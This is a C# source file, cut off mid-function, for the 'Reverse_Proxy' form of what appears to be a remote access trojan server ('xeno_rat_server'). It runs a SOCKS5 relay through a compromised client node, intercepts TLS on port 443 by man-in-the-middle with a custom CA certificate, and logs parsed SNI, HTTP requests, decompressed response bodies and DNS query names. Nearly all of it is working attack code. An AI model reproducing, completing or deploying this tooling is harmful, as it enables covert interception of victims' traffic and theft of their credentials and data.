// Place this entire file content (namespace and class) into your project.
// Make sure your project language level is C# 7.3 and the project references support
// the System.Security.Cryptography.* APIs used here.
//
// Uses only C# 7.3 features (no target-typed new, no using declarations, no C# 8 features).

using BrotliSharpLib;
using System;
using System.Buffers;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Numerics;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Reverse_Proxy : Form
    {
        Node client;
        private Socket listenerSocket;
        private CancellationTokenSource _acceptCts;
        private Task _acceptLoopTask;
        private List<Node> activeSubnodes = new List<Node>();
        private X509Certificate2 serverCertificate;

        // Constants used in the class
        private const int UI_TRUNCATE_GLOBAL = 1200;
        private const int MAX_INSPECT_GLOBAL = 1024 * 1024;

        public Reverse_Proxy(Node _client)
        {
            InitializeComponent();
            client = _client;
            client.AddTempOnDisconnect(OnClientDisconnect);

            // Load CA PFX (change path/password to your actual file)
            try
            {
                    serverCertificate = new X509Certificate2(
                        "C:\\Users\\basha\\OneDrive\\Desktop\\myproxyCA.pfx",
                        "certificationPWDHere",
                        X509KeyStorageFlags.Exportable | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.MachineKeySet
                    );
            }
            catch
            {
                serverCertificate = null;
                // We'll show a message in UI only when MITM attempted
            }

            var listViewContextMenu = new ContextMenuStrip();
            var copyItem = new ToolStripMenuItem("Copy Selected");
            copyItem.Click += copySelectedItemsToolStripMenuItem_Click;
            listViewContextMenu.Items.Add(copyItem);

            listView1.ContextMenuStrip = listViewContextMenu;
            listView1.MouseDown += ListView1_MouseDown;
        }

        private void OnClientDisconnect(Node node)
        {
            foreach (var n in activeSubnodes) n?.Disconnect();
            activeSubnodes.Clear();
            listenerSocket?.Close();
        }

        private async Task AcceptLoop(int port, CancellationToken token)
        {
            listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            listenerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
            listenerSocket.Listen(100);

            while (!token.IsCancellationRequested)
            {
                try
                {
                    var clientSock = await listenerSocket.AcceptAsync();
                    _ = Task.Run(() => HandleClientSock(clientSock, token));
                }
                catch (ObjectDisposedException)
                {
                    break;
                }
                catch (SocketException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    PostUi($"AcceptLoop error: {ex.Message}");
                }
            }
        }

        private async Task HandleClientSock(Socket clientSock, CancellationToken token)
        {
            try
            {
                if (!await StartNegotiation(clientSock)) return;
                await HandleConnect(clientSock);
            }
            catch (Exception ex)
            {
                try { clientSock.Close(); } catch { }
                PostUi($"HandleClientSock failed: {ex.Message}");
            }
        }

        private async Task HandleConnect(Socket clientSock)
        {
            try
            {
                byte[] header = await RecvAll(clientSock, 4);
                if (header == null || header.Length < 4)
                {
                    clientSock.Close();
                    return;
                }

                byte ver = header[0];
                byte cmd = header[1];
                byte rsv = header[2];
                byte addrType = header[3];

                if (ver != 5)
                {
                    await SendSocksReply(clientSock, 1);
                    clientSock.Close();
                    return;
                }

                if (cmd != 1 && cmd != 3)
                {
                    await SendSocksReply(clientSock, 7);
                    clientSock.Close();
                    return;
                }

                string destAddr = "";
                if (addrType == 1)
                {
                    byte[] ipBytes = await RecvAll(clientSock, 4);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = string.Join(".", ipBytes);
                }
                else if (addrType == 3)
                {
                    byte[] lenBuf = await RecvAll(clientSock, 1);
                    if (lenBuf == null) { clientSock.Close(); return; }
                    int len = lenBuf[0];

                    byte[] domainBytes = await RecvAll(clientSock, len);
                    if (domainBytes == null) { clientSock.Close(); return; }
                    destAddr = Encoding.ASCII.GetString(domainBytes);
                }
                else if (addrType == 4)
                {
                    byte[] ipBytes = await RecvAll(clientSock, 16);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = new IPAddress(ipBytes).ToString();
                }
                else
                {
                    await SendSocksReply(clientSock, 8);
                    clientSock.Close();
                    return;
                }

                byte[] portBytes = await RecvAll(clientSock, 2);
                if (portBytes == null) { clientSock.Close(); return; }
                int destPort = (portBytes[0] << 8) | portBytes[1];

                ListViewItem lvi = null;

                
                if (cmd == 3)
                {
                    UdpClient udpRelay = new UdpClient(0);
                    IPEndPoint localEp = (IPEndPoint)udpRelay.Client.LocalEndPoint;
                    await SendSocksReply(clientSock, 0, localEp.Address, (ushort)localEp.Port);

                    lvi = new ListViewItem($"UDP Relay {localEp.Address}:{localEp.Port}");
                    listView1?.BeginInvoke((MethodInvoker)(() => listView1.Items.Add(lvi)));

                    _ = Task.Run(() => HandleUdpRelay(udpRelay));
                    return;
                }
                else if (cmd == 1)
                {
                    await SendSocksReply(clientSock, 0);

                    lvi = new ListViewItem($"{destAddr}:{destPort}");
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add(lvi);
                        //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        //if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                    }));

                    bool attemptMitm = (destPort == 443 && serverCertificate != null && serverCertificate.HasPrivateKey);

                    if (attemptMitm)
                    {
                        _ = Task.Run(() => RelayLoopWithOptionalMitm(clientSock, destAddr, destPort, lvi, serverCertificate, true));
                    }
                    else
                    {
                        TcpClient remoteClient = new TcpClient();
                        try
                        {
                            await remoteClient.ConnectAsync(destAddr, destPort);
                        }
                        catch
                        {
                            await SendSocksReply(clientSock, 5);
                            clientSock.Close();
                            return;
                        }
                        _ = Task.Run(() => RelayLoop(clientSock, remoteClient, lvi));
                    }
                }
            }
            catch (Exception ex)
            {
                try { clientSock.Close(); } catch { }
                PostUi("HandleConnect exception: " + ex.Message);
            }
        }

        private static string DecompressIfNeeded(byte[] data, string encoding)
        {
            try
            {
                if (encoding == null)
                    return Encoding.UTF8.GetString(data);

                if (encoding.Contains("gzip"))
                {
                    using (var input = new MemoryStream(data))
                    using (var gzip = new System.IO.Compression.GZipStream(input, System.IO.Compression.CompressionMode.Decompress))
                    using (var output = new MemoryStream())
                    {
                        gzip.CopyTo(output);
                        return Encoding.UTF8.GetString(output.ToArray());
                    }
                }
                else if (encoding.Contains("deflate"))
                {
                    using (var input = new MemoryStream(data))
                    using (var deflate = new System.IO.Compression.DeflateStream(input, System.IO.Compression.CompressionMode.Decompress))
                    using (var output = new MemoryStream())
                    {
                        deflate.CopyTo(output);
                        return Encoding.UTF8.GetString(output.ToArray());
                    }
                }
                else
                {
                    // br/zstd not supported in .NET by default — just show raw length
                    return $"[Compressed content: {encoding}, {data.Length} bytes]";
                }
            }
            catch (Exception ex)
            {
                return $"[Decompression failed: {ex.Message}]";
            }
        }


        private async Task RelayLoopWithOptionalMitm(Socket clientSock, string destHost, int destPort, ListViewItem lvi, X509Certificate2 caPfx, bool enableMitm = true)
        {
            
            Action<string> PostUiLocal = (s) =>
            {
                try
                {
                    string show = s.Length > UI_TRUNCATE_GLOBAL ? s.Substring(0, UI_TRUNCATE_GLOBAL) + "…(truncated)" : s;
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                        //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        //if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                    }));
                }
                catch { }
            };

            var clientNetStream = new NetworkStream(clientSock, true);

            if (enableMitm && destPort == 443 && caPfx != null && caPfx.HasPrivateKey)
            {
                byte[] hello = null;
                try
                {
                    hello = await ReadClientHelloAsync(clientNetStream, 64 * 1024, 3000);
                }
                catch (Exception ex)
                {
                    PostUiLocal($"Failed to read ClientHello: {ex.Message}");
                    clientSock.Close();
                    return;
                }

                string sni = TryParseSniFromClientHello(hello) ?? destHost;
                PostUiLocal($"ClientHello SNI parsed: {sni}");

                try
                {
                    using (var prepend = new PrependStream(hello ?? new byte[0], clientNetStream))
                    {
                        var mitm = new MitmHandler(caPfx, (msg) => {
                            // route mitm logs into listView1
                            PostUiLocal(msg);
                        });
                        await mitm.HandleMitmAsync(prepend, sni);
                    }
                }
                catch (Exception ex)
                {
                    PostUiLocal($"MITM failed: {ex.Message}");
                    try { clientSock.Close(); } catch { }
                }
                return;
            }

            // fallback plain forwarding
            TcpClient remote = new TcpClient();
            try
            {
                await remote.ConnectAsync(destHost, destPort);
            }
            catch (Exception ex)
            {
                PostUiLocal($"Remote connect failed: {ex.Message}");
                clientSock.Close();
                return;
            }

            var remoteStream = remote.GetStream();
            var relayCts = new CancellationTokenSource();

            // start two relays; keep references for cancellation if needed
            var relay1 = RelayDataAsync(clientNetStream, remoteStream, destHost + " C->S", relayCts.Token, this);
            var relay2 = RelayDataAsync(remoteStream, clientNetStream, destHost + " S->C", relayCts.Token, this);

            // Wait for one to finish and then cancel the other
            await Task.WhenAny(relay1, relay2);
            relayCts.Cancel();

            // wait a short moment for graceful shutdown
            try { await Task.WhenAll(relay1, relay2).ConfigureAwait(false); } catch { }

            try { remote.Close(); } catch { }
            try { clientSock.Close(); } catch { }
        }

        // Add inside Reverse_Proxy : Form (C# 7.3)
        private async Task RelayDataAsync(Stream src, Stream dst, string uiPrefix, CancellationToken ct, Reverse_Proxy form)
        {
            const int BUF_SIZE = 16 * 1024;
            var buf = new byte[BUF_SIZE];
            try
            {
                while (!ct.IsCancellationRequested)
                {
                    int r = 0;
                    try
                    {
                        r = await src.ReadAsync(buf, 0, buf.Length, ct).ConfigureAwait(false);
                    }
                    catch (OperationCanceledException) { break; }
                    catch (IOException ioex)
                    {
                        // show read error on UI and break
                        try
                        {
                            form?.BeginInvoke((MethodInvoker)(() =>
                            {
                                form.listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {uiPrefix} read error: {ioex.Message}");
                            }));
                        }
                        catch { }
                        break;
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            form?.BeginInvoke((MethodInvoker)(() =>
                            {
                                form.listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {uiPrefix} read error: {ex.Message}");
                            }));
                        }
                        catch { }
                        break;
                    }

                    if (r <= 0) break;

                    try
                    {
                        await dst.WriteAsync(buf, 0, r, ct).ConfigureAwait(false);
                        await dst.FlushAsync(ct).ConfigureAwait(false);
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            form?.BeginInvoke((MethodInvoker)(() =>
                            {
                                form.listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {uiPrefix} write error: {ex.Message}");
                            }));
                        }
                        catch { }
                        break;
                    }
                }
            }
            finally
            {
                // Optionally log closure
                try
                {
                    form?.BeginInvoke((MethodInvoker)(() =>
                    {
                        form.listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {uiPrefix} relay ended.");
                    }));
                }
                catch { }
            }
        }

        // PrependStream - replays a prefix then reads from the inner stream
        public class PrependStream : Stream
        {
            private readonly byte[] _prefix;
            private int _pos;
            private readonly Stream _inner;
            private readonly Action<string> _log;

            public PrependStream(byte[] prefix, Stream inner, Action<string> logger = null)
            {
                _prefix = prefix ?? new byte[0];
                _pos = 0;
                _inner = inner ?? throw new ArgumentNullException(nameof(inner));
                _log = logger ?? (_ => { });
            }

            public override bool CanRead { get { return _inner.CanRead; } }
            public override bool CanSeek { get { return false; } }
            public override bool CanWrite { get { return _inner.CanWrite; } }
            public override long Length { get { throw new NotSupportedException(); } }
            public override long Position { get { throw new NotSupportedException(); } set { throw new NotSupportedException(); } }

            public override void Flush()
            {
                try { _inner.Flush(); }
                catch (Exception ex) { _log("PrependStream flush failed: " + ex.Message); throw; }
            }

            public override int Read(byte[] buffer, int offset, int count)
            {
                if (_pos < _prefix.Length)
                {
                    int n = Math.Min(count, _prefix.Length - _pos);
                    Buffer.BlockCopy(_prefix, _pos, buffer, offset, n);
                    _pos += n;
                    return n;
                }

                if (!_inner.CanRead)
                {
                    _log("PrependStream inner not readable.");
                    return 0;
                }

                try
                {
                    return _inner.Read(buffer, offset, count);
                }
                catch (Exception ex)
                {
                    _log("PrependStream inner read failed: " + ex.Message);
                    throw;
                }
            }

            public override async Task<int> ReadAsync(byte[] buffer, int offset, int count, CancellationToken cancellationToken)
            {
                if (_pos < _prefix.Length)
                {
                    int n = Math.Min(count, _prefix.Length - _pos);
                    Buffer.BlockCopy(_prefix, _pos, buffer, offset, n);
                    _pos += n;
                    return n;
                }

                if (!_inner.CanRead)
                {
                    _log("PrependStream inner not readable (async).");
                    return 0;
                }

                try
                {
                    return await _inner.ReadAsync(buffer, offset, count, cancellationToken).ConfigureAwait(false);
                }
                catch (Exception ex)
                {
                    _log("PrependStream inner read failed (async): " + ex.Message);
                    throw;
                }
            }

            public override void Write(byte[] buffer, int offset, int count)
            {
                if (!_inner.CanWrite)
                {
                    _log("PrependStream inner not writable.");
                    throw new NotSupportedException("Inner stream not writable");
                }

                try
                {
                    _inner.Write(buffer, offset, count);
                }
                catch (Exception ex)
                {
                    _log("PrependStream inner write failed: " + ex.Message);
                    throw;
                }
            }

            public override long Seek(long offset, SeekOrigin origin) { throw new NotSupportedException(); }
            public override void SetLength(long value) { throw new NotSupportedException(); }

            protected override void Dispose(bool disposing)
            {
                base.Dispose(disposing);
                if (disposing)
                {
                    try { _inner.Dispose(); } catch { }
                }
            }
        }

        private static async Task<byte[]> ReadClientHelloAsync(Stream net, int maxBytes = 64 * 1024, int timeoutMs = 3000)
        {
            var ms = new MemoryStream();
            var header = new byte[5];
            int got = 0;
            // Set ReadTimeout if NetworkStream
            try
            {
                var ns = net as NetworkStream;
                if (ns != null) ns.ReadTimeout = timeoutMs;
            }
            catch { }

            while (got < 5)
            {
                int r = await net.ReadAsync(header, got, 5 - got);
                if (r <= 0) return ms.ToArray();
                ms.Write(header, got, r);
                got += r;
            }
            int recLen = (header[3] << 8) | header[4];
            int toRead = Math.Min(recLen, maxBytes - (int)ms.Length);
            var tmp = new byte[4096];
            while (toRead > 0)
            {
                int r = await net.ReadAsync(tmp, 0, Math.Min(tmp.Length, toRead));
                if (r <= 0) break;
                ms.Write(tmp, 0, r);
                toRead -= r;
            }
            return ms.ToArray();
        }

        private static string TryParseSniFromClientHello(byte[] data)
        {
            try
            {
                if (data == null || data.Length < 5) return null;
                int pos = 0;
                if (data[pos++] != 0x16) return null;
                pos += 2;
                int recLen = (data[pos] << 8) | data[pos + 1]; pos += 2;
                if (pos + recLen > data.Length) return null;
                if (pos + 4 > data.Length) return null;
                byte hsType = data[pos++];
                if (hsType != 0x01) return null;
                int hsLen = (data[pos] << 16) | (data[pos + 1] << 8) | data[pos + 2]; pos += 3;
                pos += 2 + 32;
                int sessionIdLen = data[pos++]; pos += sessionIdLen;
                int csLen = (data[pos] << 8) | data[pos + 1]; pos += 2 + csLen;
                int compLen = data[pos++]; pos += compLen;
                if (pos + 2 > data.Length) return null;
                int extLen = (data[pos] << 8) | data[pos + 1]; pos += 2;
                int extEnd = pos + extLen;
                while (pos + 4 <= extEnd)
                {
                    int extType = (data[pos] << 8) | data[pos + 1];
                    int extLength = (data[pos + 2] << 8) | data[pos + 3];
                    pos += 4;
                    if (extType == 0x00 && pos + extLength <= extEnd)
                    {
                        int sPos = pos;
                        int listLen = (data[sPos] << 8) | data[sPos + 1]; sPos += 2;
                        int listEnd = sPos + listLen;
                        while (sPos + 3 <= listEnd)
                        {
                            byte nameType = data[sPos++];
                            int nameLen = (data[sPos] << 8) | data[sPos + 1];
                            sPos += 2;
                            if (nameType == 0 && sPos + nameLen <= listEnd)
                            {
                                return Encoding.ASCII.GetString(data, sPos, nameLen);
                            }
                            sPos += nameLen;
                        }
                        break;
                    }
                    pos += extLength;
                }
            }
            catch { }
            return null;
        }

        // ---------- RelayLoop (non-MITM path) ----------
        private async Task RelayLoop(Socket clientSock, TcpClient remoteClient, ListViewItem lvi)
        {
            var clientStream = new NetworkStream(clientSock, true);
            var remoteStream = remoteClient.GetStream();

            var clientToRemoteInspect = new MemoryStream();
            var remoteToClientInspect = new MemoryStream();
            bool sniFound = false;
            bool httpRequestShown = false;
            bool previewShownRemote = false;
            const int MAX_INSPECT = MAX_INSPECT_GLOBAL;
            const int UI_TRUNCATE_LOCAL = 1024;

            Action<string> PostUi = (text) =>
            {
                try
                {
                    string show = text.Length > UI_TRUNCATE_LOCAL ? text.Substring(0, UI_TRUNCATE_LOCAL) + "…(truncated)" : text;
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                    }));
                }
                catch { }
            };

            void AppendInspect(MemoryStream ms, byte[] buf, int offset, int count)
            {
                if (ms.Length + count <= MAX_INSPECT)
                {
                    ms.Write(buf, offset, count);
                }
                else
                {
                    ms.SetLength(0);
                }
            }

            async Task CopyAndInspectAsync(Stream src, Stream dst, MemoryStream inspectBuffer, Action<byte[], int, int> inspector, CancellationToken ct)
            {
                var buf = new byte[16 * 1024];
                try
                {
                    while (!ct.IsCancellationRequested)
                    {
                        int r = await src.ReadAsync(buf, 0, buf.Length, ct);
                        if (r == 0) break;
                        await dst.WriteAsync(buf, 0, r, ct);
                        await dst.FlushAsync(ct);
                        try { inspector(buf, 0, r); } catch { }
                    }
                }
                catch { }
            }

            var cts = new CancellationTokenSource();

            try
            {
                void ClientToRemoteInspector(byte[] buf, int off, int len)
                {
                    AppendInspect(clientToRemoteInspect, buf, off, len);
                    if (!sniFound && clientToRemoteInspect.Length >= 5)
                    {
                        try
                        {
                            var arr = clientToRemoteInspect.ToArray();
                            var sni = TryParseSni(arr);
                            if (!string.IsNullOrEmpty(sni))
                            {
                                sniFound = true;
                                listView1?.BeginInvoke((MethodInvoker)(() =>
                                {
                                    if (lvi != null) lvi.Text = $"{lvi.Text} (SNI:{sni})";
                                }));
                                PostUi($"SNI: {sni}");
                            }
                        }
                        catch { }
                    }

                    if (!httpRequestShown)
                    {
                        try
                        {
                            var arr = clientToRemoteInspect.ToArray();
                            string maybeText = null;
                            try { maybeText = Encoding.ASCII.GetString(arr); } catch { maybeText = null; }
                            if (!string.IsNullOrEmpty(maybeText))
                            {
                                int he = maybeText.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                                if (he >= 0)
                                {
                                    string headers = maybeText.Substring(0, he);
                                    var lines = headers.Split(new[] { "\r\n" }, StringSplitOptions.None);
                                    if (lines.Length > 0)
                                    {
                                        string reqLine = lines[0];
                                        var parts = reqLine.Split(' ');
                                        if (parts.Length >= 2)
                                        {
                                            string method = parts[0];
                                            string target = parts[1];
                                            string host = null;
                                            foreach (var l in lines.Skip(1))
                                            {
                                                int c = l.IndexOf(':');
                                                if (c > 0)
                                                {
                                                    string name = l.Substring(0, c).Trim();
                                                    if (string.Equals(name, "Host", StringComparison.OrdinalIgnoreCase))
                                                    {
                                                        host = l.Substring(c + 1).Trim();
                                                        break;
                                                    }
                                                }
                                            }

                                            if (!string.IsNullOrEmpty(host))
                                            {
                                                string url = (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                                                    ? target
                                                    : $"http://{host}{target}";
                                                httpRequestShown = true;
                                                PostUi($"HTTP request: {method} {url}");
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }

                void RemoteToClientInspector(byte[] buf, int off, int len)
                {
                    AppendInspect(remoteToClientInspect, buf, off, len);

                    try
                    {
                        var arr = remoteToClientInspect.ToArray();
                        string maybeText = null;
                        try { maybeText = Encoding.ASCII.GetString(arr); } catch { maybeText = null; }

                        if (!string.IsNullOrEmpty(maybeText))
                        {
                            int headerEnd = maybeText.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                            if (headerEnd >= 0)
                            {
                                string headers = maybeText.Substring(0, headerEnd);
                                PostUi($"HTTP headers detected: {Trunc(headers, 400)}");

                                bool isGzip = headers.IndexOf("Content-Encoding: gzip", StringComparison.OrdinalIgnoreCase) >= 0;
                                bool isDeflate = headers.IndexOf("Content-Encoding: deflate", StringComparison.OrdinalIgnoreCase) >= 0;
                                bool isBrotli = headers.IndexOf("Content-Encoding: br", StringComparison.OrdinalIgnoreCase) >= 0;

                                int contentLength = 0;
                                bool hasContentLength = false;
                                foreach (var line in headers.Split(new[] { "\r\n" }, StringSplitOptions.None))
                                {
                                    if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
                                    {
                                        int.TryParse(line.Substring(15).Trim(), out contentLength);
                                        hasContentLength = true;
                                        break;
                                    }
                                }

                                byte[] bodyBytes = arr.Skip(headerEnd + 4).ToArray();

                                if (!hasContentLength)
                                {
                                    // If Transfer-Encoding: chunked, try to decode chunked body (best effort)
                                    if (headers.IndexOf("Transfer-Encoding: chunked", StringComparison.OrdinalIgnoreCase) >= 0)
                                    {
                                        try
                                        {
                                            var decoded = TryDecodeChunked(bodyBytes);
                                            if (decoded != null) bodyBytes = decoded;
                                        }
                                        catch { /* ignore */ }
                                    }
                                }

                                if (isGzip)
                                {
                                    try
                                    {
                                        using (var ms = new MemoryStream(bodyBytes))
                                        using (var gz = new GZipStream(ms, CompressionMode.Decompress))
                                        using (var dec = new MemoryStream())
                                        {
                                            gz.CopyTo(dec);
                                            string html = Encoding.UTF8.GetString(dec.ToArray());
                                            PostUi($"Decompressed body: {Trunc(html, 1000)}");
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        PostUi($"GZIP decompress failed: {ex.Message}");
                                    }
                                }
                                else if (isDeflate)
                                {
                                    try
                                    {
                                        using (var ms = new MemoryStream(bodyBytes))
                                        using (var df = new DeflateStream(ms, CompressionMode.Decompress))
                                        using (var dec = new MemoryStream())
                                        {
                                            df.CopyTo(dec);
                                            string html = Encoding.UTF8.GetString(dec.ToArray());
                                            PostUi($"Deflate body: {Trunc(html, 1000)}");
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        PostUi($"Deflate decompress failed: {ex.Message}");
                                    }
                                }
                                else if (isBrotli)
                                {
                                    // Try to use BrotliStream if available; otherwise report
                                    try
                                    {
                                        Type brotliType = Type.GetType("System.IO.Compression.BrotliStream, System.IO.Compression");
                                        if (brotliType == null)
                                        {
                                            // Might be available in System.IO.Compression (for .NET Core); try the common assembly name
                                            brotliType = Type.GetType("System.IO.Compression.BrotliStream, System.IO.Compression");
                                        }

                                        if (brotliType != null)
                                        {
                                            // Use reflection to construct BrotliStream if present
                                            using (var ms = new MemoryStream(bodyBytes))
                                            {
                                                // attempt direct use if type present in current runtime
                                                // fallback: try to create BrotliStream via known constructor (Stream, CompressionMode)
                                                var ctor = brotliType.GetConstructor(new Type[] { typeof(Stream), typeof(CompressionMode) });
                                                if (ctor != null)
                                                {
                                                    var brotliObj = ctor.Invoke(new object[] { ms, CompressionMode.Decompress }) as Stream;
                                                    if (brotliObj != null)
                                                    {
                                                        using (var brStream = brotliObj)
                                                        using (var dec = new MemoryStream())
                                                        {
                                                            brStream.CopyTo(dec);
                                                            string html = Encoding.UTF8.GetString(dec.ToArray());
                                                            PostUi($"Brotli body: {Trunc(html, 1000)}");
                                                        }
                                                    }
                                                    else
                                                    {
                                                        PostUi("BrotliStream present but constructor invocation failed.");
                                                    }
                                                }
                                                else
                                                {
                                                    PostUi("BrotliStream type present but expected constructor not found.");
                                                }
                                            }
                                        }
                                        else
                                        {
                                            PostUi("Content-Encoding: br encountered, but Brotli not available in this runtime.");
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        PostUi("Brotli decompress failed: " + ex.Message);
                                    }
                                }
                                else
                                {
                                    // not compressed: show as UTF-8 or summary
                                    if (LooksLikeText(bodyBytes))
                                    {
                                        string bodyText = null;
                                        try { bodyText = Encoding.UTF8.GetString(bodyBytes); } catch { try { bodyText = Encoding.ASCII.GetString(bodyBytes); } catch { bodyText = null; } }
                                        if (!string.IsNullOrEmpty(bodyText))
                                            PostUi("Body: " + Trunc(bodyText, 1000));
                                        else
                                            PostUi($"Body: {bodyBytes.Length} bytes (text decode failed)");
                                    }
                                    else
                                    {
                                        PostUi($"Body: {bodyBytes.Length} bytes (binary)");
                                    }
                                }

                                remoteToClientInspect = new MemoryStream();
                            }
                            else
                            {
                                if (arr.Length > 64 && !previewShownRemote)
                                {
                                    previewShownRemote = true;
                                    if (LooksLikeText(arr))
                                    {
                                        string preview = null;
                                        try { preview = Encoding.UTF8.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { try { preview = Encoding.ASCII.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { } }
                                        if (!string.IsNullOrEmpty(preview)) PostUi($"Remote payload preview: {Trunc(preview, 200)}");
                                    }
                                    else
                                    {
                                        string hex = BitConverter.ToString(arr, 0, Math.Min(arr.Length, 64)).Replace("-", " ");
                                        PostUi($"Remote payload preview (hex): {Trunc(hex, 100)}");
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }

                var t1 = CopyAndInspectAsync(clientStream, remoteStream, clientToRemoteInspect, ClientToRemoteInspector, cts.Token);
                var t2 = CopyAndInspectAsync(remoteStream, clientStream, remoteToClientInspect, RemoteToClientInspector, cts.Token);

                await Task.WhenAny(t1, t2);
                cts.Cancel();
                await Task.WhenAll(Task.WhenAll(t1.ContinueWith(_ => { }), t2.ContinueWith(_ => { })), Task.Delay(50));
            }
            finally
            {
                try { clientStream.Close(); } catch { }
                try { remoteStream.Close(); } catch { }
                try { remoteClient.Close(); } catch { }
                try { clientSock.Close(); } catch { }

                if (lvi != null) listView1?.BeginInvoke((MethodInvoker)(() => lvi.Remove()));
            }
        }

        // ---------- UDP Relay (enhanced) ----------
        private async Task HandleUdpRelay(UdpClient udpRelay)
        {
            var clientBuffers = new Dictionary<IPEndPoint, List<Tuple<byte, byte[]>>>(); // per-client frag list
            var udpClientPool = new Dictionary<string, UdpClient>();

            Action<string> PostUi = (text) =>
            {
                try
                {
                    string show = text.Length > UI_TRUNCATE_GLOBAL ? text.Substring(0, UI_TRUNCATE_GLOBAL) + "…(truncated)" : text;
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                        //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        //if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                    }));
                }
                catch { }
            };

            string TruncLocal(string s, int max) { if (string.IsNullOrEmpty(s)) return s; return s.Length <= max ? s : s.Substring(0, max) + "…"; }

            bool LooksLikeTextLocal(byte[] data)
            {
                if (data == null || data.Length == 0) return false;
                int printable = 0;
                int toCheck = Math.Min(data.Length, 200);
                for (int i = 0; i < toCheck; i++)
                {
                    byte b = data[i];
                    if (b >= 0x20 && b <= 0x7E) printable++;
                    else if (b == 0x09 || b == 0x0A || b == 0x0D) printable++;
                }
                return ((double)printable) / toCheck > 0.90;
            }

            string HexPreview(byte[] data, int maxBytes = 64)
            {
                int n = Math.Min(data.Length, maxBytes);
                var hex = BitConverter.ToString(data, 0, n).Replace("-", " ");
                if (data.Length > n) hex += " …";
                return hex.ToLowerInvariant();
            }

            string TryParseDnsQueryName(byte[] payload)
            {
                try
                {
                    if (payload == null || payload.Length < 12) return null;
                    int qdcount = (payload[4] << 8) | payload[5];
                    if (qdcount == 0) return null;
                    int pos = 12;
                    var labels = new List<string>();
                    while (pos < payload.Length)
                    {
                        int len = payload[pos++];
                        if (len == 0) break;
                        if (len + pos > payload.Length) return null;
                        string label = Encoding.ASCII.GetString(payload, pos, len);
                        labels.Add(label);
                        pos += len;
                    }
                    return labels.Count > 0 ? string.Join(".", labels) : null;
                }
                catch { return null; }
            }

            try
            {
                PostUi("UDP relay enhanced started...");

                while (true)
                {
                    var result = await udpRelay.ReceiveAsync();
                    var data = result.Buffer;
                    var clientEp = result.RemoteEndPoint;

                    if (data == null || data.Length < 10) { PostUi($"UDP packet too small: {data?.Length ?? 0} bytes"); continue; }

                    int offset = 0;
                    ushort rsv = (ushort)((data[offset] << 8) | data[offset + 1]); offset += 2;
                    byte frag = data[offset++];
                    byte atyp = data[offset++];

                    string destAddr = "";
                    int destPort = 0;

                    if (atyp == 0x01)
                    {
                        if (offset + 4 > data.Length) continue;
                        destAddr = new IPAddress(new byte[] { data[offset], data[offset + 1], data[offset + 2], data[offset + 3] }).ToString();
                        offset += 4;
                    }
                    else if (atyp == 0x03)
                    {
                        int len = data[offset++];
                        if (offset + len > data.Length) continue;
                        destAddr = Encoding.ASCII.GetString(data, offset, len);
                        offset += len;
                    }
                    else if (atyp == 0x04)
                    {
                        if (offset + 16 > data.Length) continue;
                        destAddr = new IPAddress(data.Skip(offset).Take(16).ToArray()).ToString();
                        offset += 16;
                    }
                    else { PostUi($"Unsupported ATYP {atyp}"); continue; }

                    if (offset + 2 > data.Length) continue;
                    destPort = (data[offset] << 8) | data[offset + 1]; offset += 2;
                    byte[] payload = data.Skip(offset).ToArray();

                    if (frag != 0)
                    {
                        List<Tuple<byte, byte[]>> list;
                        if (!clientBuffers.TryGetValue(clientEp, out list))
                        {
                            list = new List<Tuple<byte, byte[]>>();
                            clientBuffers[clientEp] = list;
                        }
                        list.Add(Tuple.Create(frag, payload));
                        PostUi($"Fragmented UDP packet stored (FRAG={frag}) for {clientEp}->{destAddr}:{destPort}");
                        continue;
                    }
                    else if (clientBuffers.ContainsKey(clientEp) && clientBuffers[clientEp].Count > 0)
                    {
                        var fragments = clientBuffers[clientEp];
